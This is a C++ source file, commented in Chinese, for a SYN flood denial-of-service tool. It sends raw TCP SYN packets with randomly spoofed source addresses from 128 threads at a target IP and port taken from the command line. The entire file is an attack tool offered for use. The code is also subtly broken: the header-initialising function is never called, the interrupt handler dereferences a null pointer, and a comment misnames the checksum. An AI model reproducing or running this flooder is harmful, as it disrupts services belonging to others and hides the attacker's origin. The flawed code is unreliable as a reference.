#include <iostream>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <thread>
#include <vector>
#include <atomic>
#include <mutex>
#include <stdexcept>
#include <cstdint>

class SynFlood {
public:
    SynFlood(const std::string& target_ip, int target_port, int max_threads = 128)
            : target_ip_(target_ip), target_port_(target_port), max_threads_(max_threads),
              sockfd_(-1), alive_(true) {}

    ~SynFlood() {
        alive_ = false;
        if (sockfd_ >= 0) {
            close(sockfd_);
        }
    }

    void start() {
        createSocket();
        setupSignalHandler();
        initializeThreads();
    }

private:
    std::string target_ip_;
    int target_port_;
    int max_threads_;
    int sockfd_;
    std::atomic<bool> alive_;
    std::vector<std::thread> threads_;

    void createSocket() {
        sockfd_ = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (sockfd_ < 0) {
            throw std::runtime_error("Failed to create socket.");
        }

        int on = 1;
        if (setsockopt(sockfd_, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
            throw std::runtime_error("Failed to set socket options.");
        }
    }

    void setupSignalHandler() {
        signal(SIGINT, sig_int);
    }

    static void sig_int(int signo) {
        static_cast<SynFlood*>(nullptr)->alive_.store(false);
    }

    void initializeThreads() {
        sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(target_port_);
        addr.sin_addr.s_addr = inet_addr(target_ip_.c_str());

        for (int i = 0; i < max_threads_; ++i) {
            threads_.emplace_back(&SynFlood::sendSynPackets, this, sockfd_, addr);
        }

        joinThreads();
    }

    void joinThreads() {
        for (auto& thread : threads_) {
            thread.join();
        }
    }

    void sendSynPackets(int sockfd, const sockaddr_in& addr) {
        srand(static_cast<uint32_t>(time(nullptr)));

        char buf[100], sendbuf[100];
        int len = sizeof(ip) + sizeof(tcphdr);
        ip ip_hdr;            // IP头部
        tcphdr tcp_hdr;       // TCP头部
        pseudohdr pseudo_hdr; // TCP伪头部

        while (alive_) {
            ip_hdr.sourceIP = htonl(rand());

            // 计算IP校验和
            memset(buf, 0, sizeof(buf));
            memcpy(buf, &ip_hdr, sizeof(ip_hdr));
            ip_hdr.checksum = checksum(reinterpret_cast<const uint16_t*>(buf), sizeof(ip_hdr));

            pseudo_hdr.saddr = ip_hdr.sourceIP;

            // 计算TCP校验和
            memset(buf, 0, sizeof(buf));
            memcpy(buf, &pseudo_hdr, sizeof(pseudo_hdr));
            memcpy(buf + sizeof(pseudo_hdr), &tcp_hdr, sizeof(tcp_hdr));
            tcp_hdr.sum = checksum(reinterpret_cast<const uint16_t*>(buf), sizeof(pseudo_hdr) + sizeof(tcp_hdr));

            // 组装发送缓冲区
            memset(sendbuf, 0, sizeof(sendbuf));
            memcpy(sendbuf, &ip_hdr, sizeof(ip_hdr));
            memcpy(sendbuf + sizeof(ip_hdr), &tcp_hdr, sizeof(tcp_hdr));

            std::cout << ".";
            if (sendto(sockfd, sendbuf, len, 0, reinterpret_cast<sockaddr*>(&addr), sizeof(sockaddr_in)) < 0) {
                perror("sendto()");
                break;
            }
        }
    }

    struct ip {
        uint8_t hl_tos;
        uint16_t total_len;
        uint16_t id;
        uint16_t frag_and_flags;
        uint8_t ttl;
        uint8_t proto;
        uint16_t checksum;
        uint32_t sourceIP;
        uint32_t destIP;
    };

    struct tcphdr {
        uint16_t sport;
        uint16_t dport;
        uint32_t seq;
        uint32_t ack;
        uint8_t lenres;
        uint8_t flag;
        uint16_t win;
        uint16_t sum;
        uint16_t urp;
    };

    struct pseudohdr {
        uint32_t saddr;
        uint32_t daddr;
        uint8_t zero;
        uint8_t protocol;
        uint16_t length;
    };

    // CRC16校验
    uint16_t inline checksum(const uint16_t *buffer, uint16_t size) {
        uint32_t cksum = 0;

        while (size > 1) {
            cksum += *buffer++;
            size -= sizeof(uint16_t);
        }

        if (size) {
            cksum += *reinterpret_cast<const uint8_t*>(buffer);
        }

        cksum = (cksum >> 16) + (cksum & 0xffff);
        cksum += (cksum >> 16);

        return ~cksum;
    }

    void init_header(ip &ip_hdr, tcphdr &tcp_hdr, pseudohdr &pseudo_hdr) {
        // IP头部数据初始化
        ip_hdr.hl_tos = (4 << 4 | sizeof(ip) / sizeof(uint32_t));
        ip_hdr.total_len = htons(sizeof(ip) + sizeof(tcphdr));
        ip_hdr.id = htons(1);
        ip_hdr.frag_and_flags = htons(0x40);
        ip_hdr.ttl = 255;
        ip_hdr.proto = IPPROTO_TCP;
        ip_hdr.checksum = 0;
        ip_hdr.sourceIP = htonl(rand());
        ip_hdr.destIP = inet_addr(target_ip_.c_str());

        // TCP头部数据初始化
        tcp_hdr.sport = htons(rand() % 16383 + 49152);
        tcp_hdr.dport = htons(target_port_);
        tcp_hdr.seq = htonl(rand() % 90000000 + 2345);
        tcp_hdr.ack = 0;
        tcp_hdr.lenres = (sizeof(tcphdr) / 4 << 4 | 0);
        tcp_hdr.flag = 0x02;
        tcp_hdr.win = htons(2048);
        tcp_hdr.sum = 0;
        tcp_hdr.urp = 0;

        // TCP伪头部
        pseudo_hdr.zero = 0;
        pseudo_hdr.protocol = IPPROTO_TCP;
        pseudo_hdr.length = htons(sizeof(tcphdr));
        pseudo_hdr.daddr = inet_addr(target_ip_.c_str());
    }
};

// 主函数
int main(int argc, char *argv[]) {
    if (argc < 3) {
        std::cerr << "Usage: " << argv[0] << " <IPaddress> <Port>\n";
        return EXIT_FAILURE;
    }

    std::string dst_ip = argv[1];
    int dst_port = std::atoi(argv[2]);

    sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));

    addr.sin_family = AF_INET;
    addr.sin_port = htons(dst_port);

    if (inet_aton(dst_ip.c_str(), &addr.sin_addr) == 0) {
        std::cerr << "Invalid IP address.\n";
        return EXIT_FAILURE;
    }

    if (dst_port < 0 || dst_port > 65535) {
        std::cerr << "Invalid port number.\n";
        return EXIT_FAILURE;
    }

    std::cout << "Target IP=" << inet_ntoa(addr.sin_addr) << " Port=" << ntohs(addr.sin_port) << std::endl;

    SynFlood syn_flood(dst_ip, dst_port);
    try {
        syn_flood.start();
    } catch (const std::exception& e) {
        std::cerr << "Exception caught: " << e.what() << std::endl;
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}